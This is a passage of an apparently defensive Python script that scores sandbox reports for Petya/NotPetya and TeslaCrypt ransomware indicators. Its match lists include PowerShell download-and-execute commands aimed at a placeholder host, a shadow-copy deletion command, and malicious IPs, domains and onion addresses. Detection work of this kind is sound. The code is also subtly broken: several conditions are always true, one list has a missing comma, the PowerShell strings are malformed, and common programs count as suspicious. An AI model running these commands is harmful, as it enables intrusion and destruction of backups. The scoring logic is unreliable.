    PATH_RANSOMWARE = [r"%APPDATA%\teamviewers\msi.dll",r"c:\windows\192145.dll,StartW",
                    "C:\\bootmgr","C:\\totalcmd\\","C:\\Far2\\",
                    r"C:\Users\<User>\AppData\Local",
                    "C:\\Users\\user\\Documents\\",
                    "C:\\decrypt",
                    "C:\\DOCUME~1\\Miller\\LOCALS~1\\Temp\\",
                    "C:\\Users\\<USER>\\Downloads\\ransimware.exe",
                    r"C:\Users\USER\AppData\Local\Temp\icju1.exe","%CONHOST%","C:\\Far2\\Plugins\\"
                    "C:\\ProgramData\\Microsoft\\Crypto\\RSA","C:\\Windows\\system32\\rsaenh.dll",
                    "C:\\Users\\All Users\\Microsoft\\Crypto\\RSA\\","c:\\programdata\\microsoft\\crypto\\rsa\\",
                    "C:\\Documents and Settings\\All Users\\Microsoft\\Crypto\\RSA\\",
                    "${SamplePath}\\","<PATH_SAMPLE.EXE>","%SAMPLEPATH%",
                    r"C:\Documents and Settings\<User>\Application Data",
                    r"C:\Documents and Settings\<User>\Local Application Data","%Temp%",r"C:\Windows"
                    ]
    power_shell_cmd = ["powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"& {New-Object System.Net.WebClient).DownloadFile('http://www.server.com/', 'C:\Windows\Temp\');Start-Process 'C:\Windows\Temp\'}\"",
                    "powershell.exe -ExecutionPolicy Bypass -WindowStyle hidden -NoProfile -c \"IEX (New-Object System.Net.WebClient).DownloadString('http://www.server.com/file.ps1')\"",
                    "powershell.exe -ExecutionPolicy Bypass -WindowStyle hidden -NoProfile -c \"IEX ((new-object net.webclient).DownloadString('http://www.server.com/file.ps1'))\"",
                    "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"& {New-Object System.Net.WebClient).DownloadFile('http://www.server.com/', 'C:\Windows\Temp\');Start-Process 'C:\Windows\Temp\'}\"",
                    "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -c \"(New-Object Net.WebClient).DownloadFile('http://www.server.com/file.dll','%TEMP%\file.dll');Start-Process rundll32.exe -ArgumentList 'C:\Windows\Temp\file.dll',#1 -WindowStyle Hidden\""]
    # Check for suspicious network connections associated with petya
    SUSPICIOUS_NETWORK_IPS = ['216.194.75.142','84.200.16.242','111.90.139.247','185.100.87.209','176.31.112.10','195.123.209.40','95.141.115.108',
                            '111.90.139.247','95.141.115.49','178.62.102.107','81.30.158.223','185.165.30.222','194.58.115.219','195.22.28.251',
                            '84.200.16.242','109.234.35.230','178.62.36.228','62.76.40.44','10.0.0.51', '10.0.0.52', '185.165.29.78', '84.200.16.242', '109.234.35.230', '62.76.40.44', '194.58.115.219', '195.22.28.251', '178.62.36.228', '62.76.40.44']
    SUSPICIOUS_NETWORK_PORT = [1026,1433,1025,135,137,138,139,21,22,135,443,445,1433,1434,3389,4343,5000,5985,5355,8079,25055,4132,4124,4114,53]
    URLS_SUSPECTS = ["wowsmith1234567.top","1dnscontrol.com","kotsubynske.in","medoc-filestorage.com","me-doc.com","servhost.local","obd-memorial.ru",
                    "m.e1.ru","southfront.org","newsit.com.ua","acdcfreepower.com","peterpaul.kiev.ua","wowsmith123456789.com","petya.readme.io",
                    "ns1.registrator.name","money.cnn.com",'mischapuk6hyrn72', 'petya3jxfp2f7g3i', 'petya3sen7dyko2n', 'mischa5xyix2mrhd', 'mischapuk6hyrn72', 'petya3jxfp2f7g3i', 'petya3sen7dyko2n']
    NT_DETECTED = ["Oops, your important files are encrypted.","You became victim of the PETYA RANSOMWARE!"]
    # Registry Key of file :
    try :
        for i in dictionary["data"]["registry_keys_opened"] :
            for j in petya_REGISTRY_KEYS:
                if j in i:
                    if j in "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\":
                        if ".exe" in j or ".dll" in j:
                            total += 1
                        else:
                            total += 0
                    else:
                        total += 1
        #print("Total registry_keys_opened est : "+str(len(dictionary["data"]["registry_keys_opened"]))+"/"+str(total))
    except KeyError:
        total += 0
    

    # processes terminated
    try :
        
        for i in dictionary["data"]["processes_terminated"] :
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
            for j in PATH_RANSOMWARE:
                if j in i:
                    if "%SAMPLEPATH%" in i or "${SamplePath}" in j or j in r"C:\Users\<User>\AppData\Local" or j in "C:\\DOCUME~1\\Miller\\LOCALS~1\\Temp\\":
                        if ".exe" in i or ".dll" in i:
                            total += 1
                        else :
                            total += 0
                    else:
                        total += 1
        #print("Total processes_terminated est : "+str(len(dictionary["data"]["processes_terminated"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files deleted
    try :
        
        for i in dictionary["data"]["files_deleted"]:
            for j in petya_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j in i:
                    if "%SAMPLEPATH%" in i or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i or ".dll" in i:
                            total += 1
                        else :
                            total += 0
                    else:
                        total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
        #print("Total files_deleted est : "+str(len(dictionary["data"]["files_deleted"]))+"/"+str(total))
    except KeyError:
        total += 0
    # processes_tree
    try :
        
        for i in dictionary["data"]["processes_tree"]:
            for j in petya_EXTENSIONS:
                if j.lower() in i["name"].lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j in i:
                    if "%SAMPLEPATH%" in i["name"] or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i["name"] or ".dll" in i["name"]:
                            total += 1
                        else :
                            total += 0
                    else:
                        total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i["name"]:
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
        #print("Total processes_tree est : "+str(len(dictionary["data"]["processes_tree"]))+"/"+str(total))
    except KeyError:
        total += 0

    # signature matches
    try :
        
        for i in dictionary["data"]["signature_matches"]:
            for j in i:
                if j == "match_data":
                    for k in i[j]:
                        for l in petya_EXTENSIONS:
                            if l.lower() in k.lower():
                                total += 1
                        for l in PATH_RANSOMWARE:
                            if l.lower() in k.lower():
                                total += 1
                        for l in SUSPICIOUS_PROCESS_NAMES:
                            if l.lower() in k.lower():
                                total += 1
                        for l in petya_REGISTRY_KEYS:
                            if l in k:
                                total += 1
                        for l in NT_DETECTED:
                            if l in k:
                                total += 1
                        for l in URLS_SUSPECTS:
                            if l in k:
                                total += 1
        #print("Total signature matches est : "+str(len(dictionary["data"]["signature_matches"]))+"/"+str(total))
    except KeyError :
        total += 0
    # modules_loaded
    try :
        for i in dictionary["data"]["modules_loaded"]:
            for j in petya_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if "%SAMPLEPATH%" in i or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i or ".dll" in i:
                            total += 1
                        else :
                            total += 0
        #print("Total modules_loaded est : "+str(len(dictionary["data"]["modules_loaded"]))+"/"+str(total))
    except KeyError :
        total += 0
    #dns_lookups
    try :
        for i in dictionary["data"]["dns_lookups"]:
            for j in URLS_SUSPECTS:
                if j in i["hostname"]:
                    total += 1
            for j in SUSPICIOUS_NETWORK_IPS:
                if j in i["resolved_ips"]:
                    total += 1
            
        #print("Total dns_lookups est : "+str(len(dictionary["data"]["dns_lookups"]))+"/"+str(total))
    except KeyError :
        total += 0
    # memory_pattern_domains
    try :
        
        for i in dictionary["data"]["memory_pattern_domains"]:
            for j in URLS_SUSPECTS:
                if j.lower() in i.lower() :
                    total += 1
        #print("Total  memory_pattern_domains est : "+str(len(dictionary["data"]["memory_pattern_domains"]))+"/"+str(total))
    except KeyError :
        total += 0
    # memory_pattern_ips
    try :
        for i in dictionary["data"]["memory_pattern_ips"]:
            for j in SUSPICIOUS_NETWORK_IPS:
                if j.lower() in i.lower() :
                    total += 1
        #print("Total  memory_pattern_domains est : "+str(len(dictionary["data"]["memory_pattern_domains"]))+"/"+str(total))
    except KeyError :
        total += 0
    # mutexes created
    mutex = ["Global\\","ShimCacheMutex"]
    try :
        for i in dictionary["data"]["mutexes_created"]:
            for j in mutex:
                if j in i:
                    total += 1
        for i in dictionary["data"]["mutexes_opened"]:
            for j in mutex:
                if j in i:
                    total += 1
        #print("Total mutexes created and opened est : "+str(len(dictionary["data"]["mutexes_created"]))+"/"+str(total))
    except KeyError :
        total += 0

    # text_decoded
    try :
        
        for i in dictionary["data"]["text_decoded"]:
            if "petya" in i:
                total += 1
            for j in NT_DETECTED:
                if j in i:
                    total += 1
    except KeyError :
        total += 0

    # files_opened
    try :
        
        for i in dictionary["data"]["files_opened"]:
            for j in petya_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if "%SAMPLEPATH%" in i or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i or ".dll" in i:
                            total += 1
                        else :
                            total += 0
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
    except KeyError:
        total += 0

    #registry_keys_set
    try :
        
        for i in dictionary["data"]["registry_keys_set"]:
            for j in i:
                if j in "key":
                    for k in petya_REGISTRY_KEYS:
                        if k in i[j]:
                            total +=1
        
        #print("Total registry_keys_set est : "+str(len(dictionary["data"]["registry_keys_set"]))+"/"+str(total))
    except KeyError :
        total += 0
        
    # registry_keys_deleted
    try :
        
        for i in dictionary["data"]["registry_keys_deleted"]:
            for j in petya_REGISTRY_KEYS:
                if j in i:
                    total +=1
        
        #print("Total registry_keys_deleted est : "+str(len(dictionary["data"]["registry_keys_deleted"]))+"/"+str(total))
    except KeyError :
        total += 0

    # processes_created
    try :
        
        for i in dictionary["data"]["processes_created"]:
            for j in petya_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if "%SAMPLEPATH%" in i or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i or ".dll" in i:
                            total += 1
                        else :
                            total += 0
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
        #print("Total processes_created est : "+str(len(dictionary["data"]["processes_created"]))+"/"+str(total))
    except KeyError:
        total += 0

    # attack_techniques
    try :
        mitre_techniques = ["T1171","T1003","T1053","T1024","T1027","T1035","T1047","T1064","T1070","T1078","T1071","T1098","T1134","T1055","T1059",
                            "T1060","T1547","T1193","T1204","T1203","T1218","T1497","T1219","T1022","T1085","T1087","T1088","T1090","T1135","T1105",
                            "T1117","T1123","T1124","T1133","T1201","T1485","T1056","T1057","T1058","T1089","T1173","T1180","T1200","T1547","T1564",
                            "T1115","T1056","T1497","T1005","T1067","T1045"]
        
        for i in dictionary["data"]["attack_techniques"]:
            for j in mitre_techniques:
                if j in i:
                    total += 1
        #print("Total total est : "+str(len(dictionary["data"]["mitre_attack_techniques"]))+"/"+str(total))
    except KeyError:
        total += 0

    # ip_traffic
    
    try :
        for i in dictionary["data"]["ip_traffic"]:
            for j in i:
                if j in "destination_ip":
                    for k in SUSPICIOUS_NETWORK_IPS:
                        if k in i[j]:
                            total += 1
                if j in "destination_port":
                    for k in SUSPICIOUS_NETWORK_PORT:
                        if k == i[j]:
                            total += 1
        #print("Total ip_traffic est : "+str(5*len(dictionary["data"]["ip_traffic"]))+"/"+str(total))
    except KeyError:
        total += 0
    
    # files_copied
    
    try :
        for i in dictionary["data"]["files_copied"]:
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i["destination"].lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if "%SAMPLEPATH%" in i["destination"] or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i["destination"] or ".dll" in i["destination"]:
                            total += 1
                        else :
                            total += 0
        #print("Total files_copied est : "+str(4 * len(dictionary["data"]["files_copied"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files_written
    try :
        
        for i in dictionary["data"]["files_written"]:
            for j in petya_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if "%SAMPLEPATH%" in i or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i or ".dll" in i:
                            total += 1
                        else :
                            total += 0
            
        #print("Total files_written est : "+str(len(dictionary["data"]["files_written"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files_dropped
    try :
        
        for i in dictionary["data"]["files_dropped"]:
            for j in i:
                if "path" in j:
                    for k in petya_EXTENSIONS:
                        if k.lower() in i[j].lower():
                            total += 1
                    for k in SUSPICIOUS_PROCESS_NAMES:
                        if k.lower() in i[j].lower():
                            total += 1
                    for k in PATH_RANSOMWARE:
                        if "%SAMPLEPATH%" in i or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                            if ".exe" in i or ".dll" in i:
                                total += 1
                            else :
                                total += 0
            
        #print("Total files_dropped est : "+str(len(dictionary["data"]["files_dropped"]))+"/"+str(total))
    except KeyError:
        total += 0

    # command_executions
    try :
        
        for i in dictionary["data"]["command_executions"]:
            for j in power_shell_cmd :
                if j in i:
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j in i:
                    total += 1
        #print("Total command_executions est : "+str(2*len(dictionary["data"]["files_dropped"]))+"/"+str(total))
    except KeyError:
        total += 0

    
    # memory_pattern_urls
    try :
        
        for i in dictionary["data"]["memory_pattern_urls"]:
            for j in URLS_SUSPECTS:
                if j in i:
                    total += 1
            for j in SUSPICIOUS_NETWORK_IPS:
                if j in i:
                    total += 1
            
        #print("Total memory_pattern_urls est : "+str(len(dictionary["data"]["memory_pattern_urls"]))+"/"+str(total))
    except KeyError:
        total += 0
    # http_conversations
    try :
        for i in dictionary["data"]["http_conversations"]:
            for j in URLS_SUSPECTS:
                if j in i["url"]:
                    total += 1
            for j in SUSPICIOUS_NETWORK_IPS:
                if j in i["url"]:
                    total += 1
            
        #print("Total http_conversations est : "+str(len(dictionary["data"]["http_conversations"]))+"/"+str(total))
    except KeyError:
        total += 0
    # Calculate the probs
    #print("[petya/NotPetya] ~ La somme de tout est : "+str(total))
    return total

def check_for_TeslaCrypt_behaviors(json_file):
    # Somme total 
    total = 0

    # Read the file json
    with open(json_file) as f:
        report_data = f.read()
    dictionary = json.loads(report_data)

    # List of common file extensions encrypted by petya
    petya_EXTENSIONS = [".micro",".ttt",".xxx",".ecc",".exx",".xyz"]
    
    # List of common registry keys modified by petya
    petya_REGISTRY_KEYS = [
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers\RC4",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL",
        r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cookies",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network",
        r"HKEY_CURRENT_USER\Software",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
        r"HKEY_CURRENT_USER\Control Panel\Desktop\Wallpaper",
        r"HKEY_CURRENT_USER\Control Panel\Desktop\WallpaperStyle",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Enhanced RSA and AES Cryptographic Provider",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Strong Cryptographic Provider",
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
        r"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableRealtimeMonitoring",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableBehaviorMonitoring",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableIntrusionPreventionSystem",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
        "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Rpc\\Extensions",
        "HKEY_LOCAL_MACHINE\\Software\\WOW6432Node\\Microsoft\\Rpc",
        r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\SafeBoot\Minimal",
        r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\SafeBoot\Network",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Tracing",
        "HKEY_LOCAL_MACHINE\\Software\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options",
        "HKEY_LOCAL_MACHINE\\Software\\WOW6432Node\\Policies\\Microsoft\\Windows NT\\Rpc",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces",
        r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Nls\Locale\Alternate Sorts",
        "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal",
        "HKLM\\Software\\Microsoft\\Cryptography",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks",
        r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Disk",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
        "HKLM\\Software\\Policies\\Microsoft\\Cryptography",
        "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Strong Cryptographic Provider",
        "HKLM\\Software\\Microsoft\\Cryptography\\Offload",
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Winsock\\Setup Migration\\Providers\\Tcpip6",
        "HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\EXPLORER\\SHELL FOLDERS",
        "\\REGISTRY\\MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Rpc",
        "\\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\svchost.exe",
        "\\REGISTRY\\MACHINE\\Software\\Policies\\Microsoft\\Cryptography",
        ]
    
    # Check for suspicious process names associated with petya
    SUSPICIOUS_PROCESS_NAMES = ['net1.exe','net.exe','recover_file','Howto_Restore_FILES','recover_file_','help_recover_instructions','HELP_TO_SAVE_YOUR_FILES','HELP_TO_DECRYPT_YOUR_FILES','money.doc','fondue.exe','mshearts.exe','Win32.ExPetr.a','CRYPTBASE.dll','blastcln.exe','unlodctr.exe','rsopprov.exe','taskdl.exe', 'taskse.exe', 'psexec.exe', 'cmd.exe', 'wmiprvse.exe', 'Psexec.exe', 'mmc.exe', 'svchost.exe', 'schtasks.exe', 'wscript.exe', 'winword.exe', 'excel.exe', 'powerpnt.exe', 'msaccess.exe', 'outlook.exe', 'onenote.exe', 'steam.exe', 'chrome.exe', 'firefox.exe', 'iexplore.exe', 'opera.exe', 'safari.exe', 'thunderbird.exe', 'acrobat.exe', 'notepad.exe', 'wmic.exe', 'ctfmon.exe', 'msiexec.exe', 'rundll32.exe', 'dllhost.exe', 'taskeng.exe', 'explorer.exe', 'lsass.exe', 'rundll.exe', 'MsMpEng.exe', 'services.exe', 'wininit.exe', 'winlogon.exe', 'csrss.exe', 'smss.exe', 'spoolsv.exe', 'lsaiso.exe', 'vssadmin.exe', 'dispci.exe', 'mssecsvc.exe', 'taskhost.exe', 'dllhst3g.exe', 'conhost.exe', 'kernel32.dll', 'user32.dll', 'wininet.dll', 'winmm.dll', 'ws2_32.dll', 'gdi32.dll', 'comctl32.dll', 'ntdll.dll', 'shell32.dll', 'advapi32.dll', 'ole32.dll', 'shlwapi.dll', 'rpcrt4.dll', 'comdlg32.dll', 'crypt32.dll', 'msvcr71.dll', 'imm32.dll', 'version.dll', 'oleaut32.dll', 'iphlpapi.dll', 'urlmon.dll', 'cryptdll.dll', 'netapi32.dll', 'wintrust.dll', 'msimg32.dll', 'msvcrt.dll', 'secur32.dll', 'dnsapi.dll', 'mss32.dll', 'd3dx9_41.dll', 'rasadhlp.dll', 'sspicli.dll', 'winspool.drv', 'cryptsp.dll', 'rasapi32.dll', 'dwmapi.dll', 'rsaenh.dll', 'api-ms-win-core-libraryloader-l1-2-0.dll', 'api-ms-win-core-processthreads-l1-1-1.dll', 'api-ms-win-core-file-l1-2-1.dll', 'api-ms-win-core-heap-l1-2-0.dll', 'api-ms-win-core-debug-l1-1-1.dll', 'api-ms-win-core-synch-l1-2-0.dll', 'api-ms-win-core-handle-l1-1-0.dll', 'api-ms-win-core-localization-l1-2-0.dll', 'api-ms-win-core-console-l1-1-0.dll', 'api-ms-win-core-io-l1-1-1.dll', 'api-ms-win-core-registry-l1-1-0.dll', 'api-ms-win-core-timezone-l1-1-0.dll', 'api-ms-win-core-processthreads-l1-1-0.dll', 'api-ms-win-core-string-l1-1-0.dll', 'api-ms-win-core-threadpool-l1-2-0.dll', 'api-ms-win-core-xstate-l']
    PATH_RANSOMWARE = [r"%APPDATA%\teamviewers\msi.dll",r"c:\windows\192145.dll,StartW",
                    "C:\\bootmgr","C:\\totalcmd\\","C:\\Far2\\",
                    r"C:\Users\<User>\AppData\Local",
                    "C:\\Users\\user\\Documents\\",
                    "C:\\decrypt",
                    "C:\\DOCUME~1\\Miller\\LOCALS~1\\Temp\\",
                    "C:\\Users\\<USER>\\Downloads\\ransimware.exe",
                    r"C:\Users\USER\AppData\Local\Temp\icju1.exe","%CONHOST%",
                    "C:\\ProgramData\\Microsoft\\Crypto\\RSA","C:\\Windows\\system32\\rsaenh.dll",
                    "C:\\Users\\All Users\\Microsoft\\Crypto\\RSA\\","c:\\programdata\\microsoft\\crypto\\rsa\\",
                    "C:\\Documents and Settings\\All Users\\Microsoft\\Crypto\\RSA\\",
                    "${SamplePath}\\","<PATH_SAMPLE.EXE>","%SAMPLEPATH%",
                    r"C:\Documents and Settings\<User>\Application Data",
                    r"C:\Documents and Settings\<User>\Local Application Data","%Temp%",r"C:\Windows"
                    ]
    power_shell_cmd = ["%WinDir%\system32\vssadmin delete shadows /all","\"%ComSpec%\" /c DEL %TEMP%\\QXSOGK~1.EXE",
            "%APPDATA%\\vgxbc-a.exe"]
    # Check for suspicious network connections associated with petya
    SUSPICIOUS_NETWORK_IPS = ["50.7.138.132",'50.7.138.132', '46.4.20.40', '178.63.9.48', '94.242.216.5', '94.242.216.63']
    SUSPICIOUS_NETWORK_PORT = [49714,49701,1026,1433,1025,135,137,138,139,21,22,135,443,445,1433,1434,3389,4343,5000,5985,5355,8079,25055,4132,4124,4114,53]
    URLS_SUSPECTS = ['Tor2web.org', 'tor2web.fi','blutmagie.de',"h5534bvnrnkj345.maniupulp.com","pot98bza3sgfjr35t.fausttime.com","en.wikipedia.org",
            "bddadmin.desjardins.fr","southinstrument.org","i4sdmjn4fsdsdqfhu12l.orbyscabz.com","h5534bvnrnkj345.maniupulp.com","pot98bza3sgfjr35t.fausttime.com","i4sdmjn4fsdsdqfhu12l.orbyscabz.com","en.wikipedia.org",
            "dpckd2ftmf7lelsa.aenf387awmx28.com",'sshowmethemoney.com', 'jjeyd2u37an30.com', '63ghdye17.com', '42k2bu15.com', '42k2b14.net', '42kjb11.net', '2kjb9.net', '2kjb8.net', '2kjb7.net', '7hwr34n18.com', 'wh47f2as19.com', '63ghdye17.com', 'aw49f4j3n26.com', '79fhdm16.com', 'dfj3d8w3n27.com', '4lpwzo5ptsv6a2y5.onion', '34r6hq26q2h4jkzj.onion', 'qcuikaiye577q3p2.onion', '7tno4hib47vlep5o.onion', '3kxwjihmkgibht2s.onion', 'epmhyca5ol6plmx3.onion', 'tkj3higtqlvohs7z.onion']
    
    NT_DETECTED = ["What happened to your files ?"]
    # Registry Key of file :
    try :
        for i in dictionary["data"]["registry_keys_opened"] :
            for j in petya_REGISTRY_KEYS:
                if j in i:
                    if j in "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\":
                        if ".exe" in j or ".dll" in j:
                            total += 1
                        else:
                            total += 0
                    else:
                        total += 1
        #print("Total registry_keys_opened est : "+str(len(dictionary["data"]["registry_keys_opened"]))+"/"+str(total))
    except KeyError:
        total += 0
    

    # processes terminated
    try :
        
        for i in dictionary["data"]["processes_terminated"] :
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
            for j in PATH_RANSOMWARE:
                if j in i:
                    if "%SAMPLEPATH%" in i or "${SamplePath}" in j or j in r"C:\Users\<User>\AppData\Local" or j in "C:\\DOCUME~1\\Miller\\LOCALS~1\\Temp\\":
                        if ".exe" in i or ".dll" in i:
                            total += 1
                        else :
                            total += 0
                    else:
                        total += 1
        #print("Total processes_terminated est : "+str(len(dictionary["data"]["processes_terminated"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files deleted
    try :
        
        for i in dictionary["data"]["files_deleted"]:
            for j in petya_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j in i:
                    if "%SAMPLEPATH%" in i or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i or ".dll" in i:
                            total += 1
                        else :
                            total += 0
                    else:
                        total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
        #print("Total files_deleted est : "+str(len(dictionary["data"]["files_deleted"]))+"/"+str(total))
    except KeyError:
        total += 0
    # processes_tree
    try :
        
        for i in dictionary["data"]["processes_tree"]:
            for j in petya_EXTENSIONS:
                if j.lower() in i["name"].lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j in i:
                    if "%SAMPLEPATH%" in i["name"] or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i["name"] or ".dll" in i["name"]:
                            total += 1
                        else :
                            total += 0
                    else:
                        total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i["name"]:
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
        #print("Total processes_tree est : "+str(len(dictionary["data"]["processes_tree"]))+"/"+str(total))
    except KeyError:
        total += 0

    # signature matches
    try :
        
        for i in dictionary["data"]["signature_matches"]:
            for j in i:
                if j == "match_data":
                    for k in i[j]:
                        for l in petya_EXTENSIONS:
                            if l.lower() in k.lower():
                                total += 1
                        for l in PATH_RANSOMWARE:
                            if l.lower() in k.lower():
                                total += 1
                        for l in SUSPICIOUS_PROCESS_NAMES:
                            if l.lower() in k.lower():
                                total += 1
                        for l in petya_REGISTRY_KEYS:
                            if l in k:
                                total += 1
                        for l in NT_DETECTED:
                            if l in k:
                                total += 1
                        for l in URLS_SUSPECTS:
                            if l in k:
                                total += 1
                        if ".onion" in k or "tor" in k:
                            total += 1
        #print("Total signature matches est : "+str(len(dictionary["data"]["signature_matches"]))+"/"+str(total))
    except KeyError :
        total += 0
    # modules_loaded
    try :
        for i in dictionary["data"]["modules_loaded"]:
            for j in petya_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
